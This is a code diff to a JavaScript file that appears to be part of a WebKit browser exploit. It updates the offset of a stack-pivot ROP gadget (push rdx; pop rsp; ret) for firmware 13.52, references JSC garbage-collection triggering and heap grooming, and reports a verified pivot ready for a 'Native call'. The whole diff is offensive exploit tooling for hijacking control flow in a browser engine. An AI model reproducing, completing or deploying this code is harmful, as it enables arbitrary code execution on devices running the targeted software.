@@ -27,7 +27,7 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828s";
+const BUILD_ID = "rw-20250828t";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -40,8 +40,8 @@ const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
 const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
 /** Bounded steps per auto-loop tick — yields + GC between chunks */
 const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
-/** HW peek @ +0x2411b0 showed 48 ff c6… (not G5) — hunt rdx→rsp nearby */
-const G5_HUNT_CENTER = parseInt(params.get("g5center") || "2411b0", 16);
+/** HW G5 @ +0x13ec77a (expm1 + 0x53642a) */
+const G5_HUNT_CENTER = parseInt(params.get("g5center") || "13ec77a", 16);
 const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
 /** Legacy 13.00 high G5 — blocked on 13.52 (unmapped, OOM on read) */
 const G5_LEGACY_RVAS = [
@@ -887,11 +887,8 @@ function wireG5Bar() {
     clearHost.appendChild(restoreBtn);
 
     const hint = host.querySelector(".bar-label");
-    if (hint) {
-        const cap = webkitRvaMaxFromOff(Object.assign({}, HW_GADGETS_1352, PIVOT_HW_1352));
-        hint.textContent = "G5: 13.00 @ +0x2abccaa OOMs (unmapped) — use G5 scan upper (+0x800000…+0x"
-            + cap.toString(16) + ") or G5 hunt expm1 (+0x13ec77a)";
-    }
+    if (hint)
+        hint.textContent = "G5 HW +0x13ec77a (expm1+0x53642a) — Verify pivot then Native call";
 }
 
 function wireGadgetBars() {
@@ -1606,7 +1603,7 @@ function verifyPivotManual() {
     }
     const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
     mark("PIVOT-CHECK", "G5="
-        + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — tap G5 +0x2411ac"));
+        + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — HW +0x13ec77a"));
     const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
     if (v.missing.length)
         mark("PIVOT-MISS", v.missing.join(", ") + " — tap a G5 button above");
@@ -2063,9 +2060,7 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — G5 cap ~+0x"
-        + webkitRvaMaxFromOff(Object.assign({}, HW_GADGETS_1352, PIVOT_HW_1352)).toString(16)
-        + " (13.00 +0x2abccaa blocked)");
+    mark("BOOT", "build=" + BUILD_ID + " — pivot 7/7 HW (G5 +0x13ec77a)");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
